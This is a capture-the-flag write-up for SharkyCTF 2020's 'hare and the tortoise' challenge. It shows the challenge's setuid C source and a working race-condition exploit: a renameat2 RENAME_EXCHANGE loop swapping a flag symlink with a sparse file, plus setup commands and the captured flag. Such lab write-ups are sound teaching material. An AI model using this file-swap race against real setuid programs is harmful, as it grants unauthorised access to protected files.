title: SharkyCTF 2020 The hare and the tortoise write-up
category: [ctf, writeup]
---

This weekend, with my [team][0], I participated to [Sharky CTF][1]. We ended up
12th. Here is my write-up for the hare and the tortoise:

I'm doing a writeup for this one because I didn't take the intended route to
solve it so it might be interesting to share.

### Description:

Do you know Jean de La Fontaine? A friend of mine created a program mimicking
the hare and the tortoise. He told me that smart tortoises always wins. I want
you to be that tortoise.

Connect with ssh tortoise@172.30.0.2. Password : tortoise.

Creator : Nofix

Attached is an [OpenVPN config][2] which gives access to a private network from
which we can reach the server.

### Solution

After connecting to the server (@172.30.0.2), in the home directory there are
some files:

```
tortoise@the_hare_and_the_tortoise$ ls -l
-r-------- 1 hare hare   77 May 11 09:04 flag.txt
-r--r--r-- 1 root root 2360 May 11 09:04 main.c
-r--r--r-- 1 root root  687 May 11 09:04 semaphores.h
-r-sr-xr-x 1 hare hare 2754 May 11 09:04 the_hare_and_the_tortoise
```

Only the `hare` user has access to the flag (stored in `flag.txt`), and there's
a suid binary that I guess was compiled from the source code in `main.c`.

Here is the source code:

```c
#include <stdlib.h>
#include <stdio.h>
#include <fcntl.h>
#include <signal.h>
#include <string.h>
#include <time.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <sys/ipc.h>
#include "semaphores.h"

// The Hare and the Tortoise


#define handle_error(msg) \
    do { perror(msg); exit(EXIT_FAILURE); } while (0)


pid_t ppid;
int sem = -1;
char* sem_name;
char temp_dir[60] = {0};
char lock = 0;
char ppid_dir[30] = {0};

void cleanup(){
  if(sem != -1){
    SEM_DEL(sem);
  }
  rmdir(ppid_dir);
  rmdir(sem_name);
}

void sigint_handler(int signo){
  cleanup();
  exit(1);
}

void alarm_handler(int signo){
  cleanup();
  kill(ppid, SIGKILL);
  exit(1);
}


void random_string(){
  /* Only one execution should be allowed per term */
  sprintf(ppid_dir, "/tmp/%d", getppid());
  if(mkdir(ppid_dir, 0700) == -1){
    puts("There is no need for bruteforce");
    exit(1);
  }
  sprintf(temp_dir, "/tmp/%d/XXXXXX", getppid());
  sem_name = mkdtemp(temp_dir);
  if(sem_name == NULL){ perror("mkdtemp failed: "); exit(1); }
}

int main(int argc, char** argv){

  if(argc != 2){
    printf("Usage : %s <file to read>\n", argv[0]);
    exit(1);
  }
  atexit(cleanup);
  signal(SIGINT, sigint_handler);
  signal(SIGALRM, alarm_handler);
  random_string();
  sem = semget(ftok(sem_name, 1337 & 1), 1, IPC_CREAT | IPC_EXCL | 0600);

  if(sem == -1) handle_error("semget");

  SEM_SET(sem, 1);

  int hare = open (argv[1], O_RDONLY);
  int tortoise = open (argv[1], O_RDONLY);
  if(hare == -1 || tortoise == -1) handle_error("open");
  ppid = getpid();
  int pid;
  pid = fork();

  int cnt = 0;
  if(pid == 0) { // The hare
    puts("The hare says : \"Do you ever get anywhere?\"");
    char c;
    int y = 1;
    while(y == 1){
      SEM_WAIT(sem);
      y = read(hare, &c, sizeof(char));
      if(y == -1){ alarm(0.1);handle_error("read"); }
      usleep(100 * 750);
      SEM_POST(sem);
    }
    puts("The hare says : \"Hurry up tortoise !\"");
    alarm(5);
    sleep(10);

	} else { // The tortoise
    char c;
    int y = 1;
    while(y == 1){
      SEM_WAIT(sem);
      y = read(tortoise, &c, sizeof(char));
      printf("The tortoise, progressing slowly... : \"%c\"\n", c);
      if(y == -1){ handle_error("read"); }
      SEM_POST(sem);
      sleep(1);
    }
    puts("Slow but steady wins the race!");
  }
}
```

As you can see, a "hare" process is created (as a child) of the "tortoise"
process. The "tortoise" process starts to read the file passed by `argv[1]`
(the first argument). However, the hare process, after reading the same file a
lot more quicker, sends a `SIGALARM` signal preventing the "tortoise" process
from finishing.

```
$ ~/the_hare_and_the_tortoise ~/flag.txt
The tortoise, progressing slowly... : "s"
The hare says : "Do you ever get anywhere?"
The tortoise, progressing slowly... : "h"
The tortoise, progressing slowly... : "k"
The tortoise, progressing slowly... : "C"
The tortoise, progressing slowly... : "T"
The tortoise, progressing slowly... : "F"
The hare says : "Hurry up tortoise !"
The tortoise, progressing slowly... : "{"
The tortoise, progressing slowly... : "r"
The tortoise, progressing slowly... : "4"
The tortoise, progressing slowly... : "c"
Killed
```

After trying to understand how system V semaphores worked and not understanding
anything, I fell back to a simpler solution: The "hare" and "tortoise" process
each have their own file descriptor. The idea is to have the "hare" and
"tortoise" process open different files. The "hare" process would open a very
large file which will take time to be read, allowing the "tortoise" process to
have the time to read `flag.txt`.

The solution I took is based on [a video][5] from [liveoverflow][6], which I
had watched earlier this year.

I compiled the following code:

```c
#define _GNU_SOURCE
#define _POSIX_C_SOURCE 200809L
#define _ATFILE_SOURCE

#include <fcntl.h>
#include <stdio.h>
#include <unistd.h>
#include <linux/fs.h>
#include <sys/syscall.h>

int main() {
    while (1) {
        syscall(SYS_renameat2, AT_FDCWD, "flag", AT_FDCWD, "sparse", RENAME_EXCHANGE);
    }
}
```

and then created a large file "sparse", and a symlink to the flag inside of my
working directory in `/tmp`.

```sh
ln -s ~/flag.txt flag
truncate -s 10G sparse
```

A [sparse file][7] is a file that doesn't take space on disk (think of it like
compression (I feel like some people will hate me for this definition)).

The `racing.c` program will swap the `flag` symlink and `sparse` file thousands
of time a seconds and hopefully, when the file descriptor is opened for the
"hare", the sparse file will be the one having the name `flag` and the when the
tortoise opens the file, the symlink to `~/flag.txt`.

In one terminal, I ran the racing program that switches the files:

```sh
gcc racing.c
./a.out
```

And in another, I ran the suid binary on `flag`.

```

```

After  multiple tries, the tortoise opened the symlink to `flag.txt` instead of
the sparse file and I was able to transform the lines into a flag:

```
shkCTF{r4c35_4r3_3asi3r_wh3n_y0u_4r3_al0ne_6a26a26c57f0012ed66ab8c20e538a04}
```

Thank you to [seanjpagano][3], for your [writeup][4] which I used in order to
get the files.
